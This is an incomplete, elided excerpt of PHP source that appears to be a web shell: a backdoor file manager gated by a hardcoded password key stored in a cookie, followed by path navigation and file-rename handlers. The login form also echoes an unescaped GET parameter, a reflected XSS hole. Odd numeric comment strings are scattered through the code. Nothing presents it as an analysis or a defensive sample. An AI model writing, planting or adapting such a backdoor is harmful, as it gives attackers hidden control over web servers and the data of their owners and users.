...
$auth_key = "68e305d1e495ff5810beb763d9e1ac7c";
...
$pass = false;
if (isset($_COOKIE['pw_name_20760'])) {
    if(($_COOKIE['pw_name_20760']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_20760'])) {
        if(($_POST['pw_name_20760']) == $auth_key) {
            setcookie("pw_name_20760", $_POST['pw_name_20760']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_20760' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724682774517368 1724682774756398 1724682774640528 1724682774443055
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724682774517368 1724682774756398 1724682774640528 1724682774443055
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724682774517368 1724682774756398 1724682774640528 1724682774443055
            $name = PATH . "/" . $_GET['r'];
